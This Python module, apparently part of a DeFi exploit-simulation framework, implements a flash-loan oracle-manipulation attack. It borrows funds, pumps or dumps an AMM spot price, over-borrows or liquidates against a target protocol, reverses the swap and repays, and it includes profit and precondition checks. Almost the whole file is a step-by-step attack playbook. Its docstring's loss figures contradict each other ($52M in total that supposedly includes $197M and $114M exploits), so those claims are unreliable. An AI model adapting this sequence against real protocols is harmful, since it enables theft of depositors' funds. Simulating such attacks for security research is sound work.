"""
Oracle Manipulation Strategy

Exploits protocols that rely on manipulable price oracles (spot prices from AMMs).

This vulnerability caused $52M in losses in 2024, including major exploits
like Euler Finance ($197M) and Mango Markets ($114M).
"""

from typing import List, Any, Dict
from decimal import Decimal
from .base import StrategyTemplate
from ..simulation.evm_environment import Action, ActionType


class OracleManipulation(StrategyTemplate):
    """
    Oracle Manipulation Strategy

    Exploits protocols that use manipulable price oracles, typically spot
    prices from AMMs without TWAP (Time-Weighted Average Price).

    Attack Pattern:
    1. Flash loan large amount of token A
    2. Swap token A -> token B on AMM (manipulates spot price)
    3. Exploit the manipulated price in target protocol:
       - Over-borrow with inflated collateral value
       - Under-collateralized borrow
       - Favorable liquidations
    4. Reverse the swap or repay flash loan
    5. Profit from price manipulation

    Parameters:
    - target_protocol: Protocol with vulnerable oracle
    - oracle_source: AMM pool used as price oracle
    - manipulation_token: Token to manipulate price of
    - flash_loan_amount: Amount to borrow (evolved)
    - manipulation_direction: 'pump' or 'dump' (evolved)
    - exploit_type: 'borrow', 'liquidate', or 'swap' (evolved)

    Example (Euler-style):
        1. Flash loan 10M DAI from Aave
        2. Swap 10M DAI -> WETH on Uniswap (pumps WETH price)
        3. Protocol reads inflated WETH price from Uniswap spot
        4. Deposit 100 WETH as collateral (now worth more)
        5. Borrow maximum stablecoins (under-collateralized due to inflated price)
        6. Swap back WETH -> DAI (price returns to normal)
        7. Repay flash loan
        8. Keep borrowed stablecoins (protocol is now under-collateralized)

    Typical profit: 10% - 500% of flash loan amount
    Risk: Critical protocol invariant violation
    """

    def __init__(
        self,
        target_protocol: str = None,
        oracle_source: str = None,
        manipulation_token: str = 'WETH',
        collateral_token: str = 'WETH',
        borrow_token: str = 'USDC',
        flash_loan_amount: float = 10000000,  # 10M
        flash_loan_token: str = 'DAI',
        manipulation_direction: str = 'pump',
        exploit_type: str = 'borrow'
    ):
        super().__init__(
            name='oracle_manipulation',
            category='economic_exploit',
            parameters={
                'target_protocol': target_protocol,
                'oracle_source': oracle_source,
                'manipulation_token': manipulation_token,
                'collateral_token': collateral_token,
                'borrow_token': borrow_token,
                'flash_loan_amount': flash_loan_amount,
                'flash_loan_token': flash_loan_token,
                'manipulation_direction': manipulation_direction,
                'exploit_type': exploit_type,
            },
            description=(
                "Oracle manipulation: flash loan -> manipulate AMM spot price -> "
                "exploit protocol using manipulated price -> profit"
            ),
            tags=['oracle', 'flash_loan', 'price_manipulation', 'critical']
        )

    def generate_transactions(self, env_state: Any) -> List[Action]:
        """
        Generate oracle manipulation transaction sequence

        Returns:
            [flash_loan, manipulate_price, exploit, reverse, repay]
        """
        params = self.parameters

        transactions = []

        # Step 1: Flash loan
        flash_loan = Action(
            action_type=ActionType.FLASH_LOAN,
            parameters={
                'protocol': 'aave_v3',  # Or Balancer, Uniswap V3
                'token': params['flash_loan_token'],
                'amount': params['flash_loan_amount']
            }
        )
        transactions.append(flash_loan)

        # Step 2: Manipulate price (large swap)
        if params['manipulation_direction'] == 'pump':
            # Pump manipulation_token price by buying it
            manipulate = Action(
                action_type=ActionType.SWAP,
                parameters={
                    'pool': params['oracle_source'],
                    'token_in': params['flash_loan_token'],
                    'token_out': params['manipulation_token'],
                    'amount_in': params['flash_loan_amount'],
                    'min_amount_out': 0
                }
            )
        else:
            # Dump manipulation_token price by selling it
            manipulate = Action(
                action_type=ActionType.SWAP,
                parameters={
                    'pool': params['oracle_source'],
                    'token_in': params['manipulation_token'],
                    'token_out': params['flash_loan_token'],
                    'amount_in': 'max_available',
                    'min_amount_out': 0
                }
            )
        transactions.append(manipulate)

        # Step 3: Exploit the manipulated price
        if params['exploit_type'] == 'borrow':
            # Borrow with inflated collateral
            exploit = Action(
                action_type=ActionType.BORROW,
                parameters={
                    'protocol': params['target_protocol'],
                    'collateral': params['collateral_token'],
                    'collateral_amount': 'from_manipulation',
                    'borrow_asset': params['borrow_token'],
                    'borrow_amount': 'max_available'  # Borrow maximum
                }
            )
        elif params['exploit_type'] == 'liquidate':
            # Favorable liquidation due to manipulated price
            exploit = Action(
                action_type=ActionType.LIQUIDATE,
                parameters={
                    'protocol': params['target_protocol'],
                    'borrower': 'target_borrower',
                    'collateral': params['collateral_token'],
                    'debt': params['borrow_token']
                }
            )
        else:
            # Direct swap exploit
            exploit = Action(
                action_type=ActionType.SWAP,
                parameters={
                    'pool': params['target_protocol'],
                    'token_in': params['manipulation_token'],
                    'token_out': params['borrow_token'],
                    'amount_in': 'from_manipulation'
                }
            )
        transactions.append(exploit)

        # Step 4: Reverse price manipulation (if needed)
        reverse = Action(
            action_type=ActionType.SWAP,
            parameters={
                'pool': params['oracle_source'],
                'token_in': params['manipulation_token'],
                'token_out': params['flash_loan_token'],
                'amount_in': 'remaining_balance',
                'min_amount_out': 0
            }
        )
        transactions.append(reverse)

        # Step 5: Repay flash loan
        repay = Action(
            action_type=ActionType.REPAY,
            parameters={
                'protocol': 'aave_v3',
                'token': params['flash_loan_token'],
                'amount': params['flash_loan_amount'] * 1.0009  # Flash loan fee
            }
        )
        transactions.append(repay)

        return transactions

    def check_preconditions(self, env_state: Any) -> bool:
        """
        Check if oracle manipulation is possible

        Conditions:
        - Target protocol must use manipulable oracle
        - Oracle source (AMM) must have insufficient liquidity
        - Flash loan must be available
        - Exploit must be profitable after costs
        """
        params = self.parameters

        if not params['target_protocol'] or not params['oracle_source']:
            return False

        # Check if oracle is manipulable
        if not self._is_oracle_manipulable(env_state):
            return False

        # Check flash loan availability
        if not self._is_flash_loan_available(env_state):
            return False

        # Check profitability
        estimated_profit = self._estimate_profit(env_state)
        estimated_cost = self._estimate_cost()

        return estimated_profit > estimated_cost * 3  # 3x cost threshold

    def _is_oracle_manipulable(self, env_state: Any) -> bool:
        """
        Check if the oracle can be manipulated

        An oracle is manipulable if:
        - It uses spot price (not TWAP)
        - Liquidity is low relative to available capital
        - Single source (not multi-oracle)
        """
        oracle_source = self.parameters['oracle_source']

        if not oracle_source:
            return False

        # Check if it's a spot price oracle (vulnerable)
        # In full implementation, this would check:
        # 1. Oracle implementation (spot vs TWAP)
        # 2. Pool liquidity vs flash loan amount
        # 3. Oracle update mechanism
        # 4. Multi-oracle setup

        # Simplified check: assume manipulable if pool exists
        return oracle_source in env_state.pool_reserves

    def _is_flash_loan_available(self, env_state: Any) -> bool:
        """Check if flash loan is available"""
        flash_loan_amount = self.parameters['flash_loan_amount']
        flash_loan_token = self.parameters['flash_loan_token']

        # Check Aave V3 liquidity (simplified)
        # In full implementation, query actual Aave pool
        return flash_loan_amount > 0

    def _estimate_profit(self, env_state: Any) -> Decimal:
        """
        Estimate profit from oracle manipulation

        Profit depends on:
        - Price impact achievable
        - Amount that can be borrowed/liquidated
        - Protocol's collateral factor
        """
        flash_loan_amount = self.parameters['flash_loan_amount']

        # Simplified calculation
        # Real calculation would simulate full attack
        price_impact = self._calculate_price_impact(env_state)
        exploitable_value = flash_loan_amount * price_impact

        # Typical extraction: 20-80% of price delta
        estimated_profit = exploitable_value * 0.5

        return Decimal(estimated_profit)

    def _estimate_cost(self) -> Decimal:
        """
        Estimate cost of attack

        Costs:
        - Flash loan fee (0.09% for Aave)
        - Gas costs
        - Slippage
        """
        flash_loan_amount = self.parameters['flash_loan_amount']

        # Flash loan fee
        flash_loan_fee = flash_loan_amount * 0.0009

        # Gas costs (5 transactions)
        gas_cost = 5 * 300000 * 50 / 10**9 * 2000  # ~$150

        total_cost = flash_loan_fee + gas_cost

        return Decimal(total_cost)

    def _calculate_price_impact(self, env_state: Any) -> float:
        """
        Calculate achievable price impact

        Price impact = (flash_loan_amount / pool_liquidity) * constant
        """
        flash_loan_amount = self.parameters['flash_loan_amount']
        oracle_source = self.parameters['oracle_source']

        # Get pool liquidity
        if oracle_source in env_state.pool_reserves:
            liquidity = env_state.pool_reserves[oracle_source].get(
                self.parameters['flash_loan_token'],
                10000000  # Default 10M
            )
        else:
            liquidity = 10000000

        # Simplified constant product formula
        # Real impact = k / (k - x) - 1, where k is liquidity
        price_impact = flash_loan_amount / (liquidity + flash_loan_amount)

        return min(price_impact, 0.9)  # Cap at 90% impact

    def calculate_profit(self, initial_state: Any, final_state: Any) -> Decimal:
        """
        Calculate actual profit from oracle manipulation

        Profit = borrowed_value - flash_loan_repayment - gas_costs
        """
        # Get balance changes
        borrow_token = self.parameters['borrow_token']
        flash_loan_token = self.parameters['flash_loan_token']

        # Simplified: calculate based on state changes
        profit = Decimal(final_state.total_value_extracted - initial_state.total_value_extracted)

        return profit

    def detect_vulnerable_protocols(self, env_state: Any) -> List[Dict[str, Any]]:
        """
        Detect protocols vulnerable to oracle manipulation

        Returns:
            List of vulnerable protocol configurations
        """
        vulnerable = []

        # Common vulnerable patterns:
        # 1. Using Uniswap V2 spot price
        # 2. Low liquidity oracles
        # 3. Single oracle source
        # 4. No TWAP

        # In full implementation, this would scan deployed protocols
        # and analyze their oracle implementations

        return vulnerable
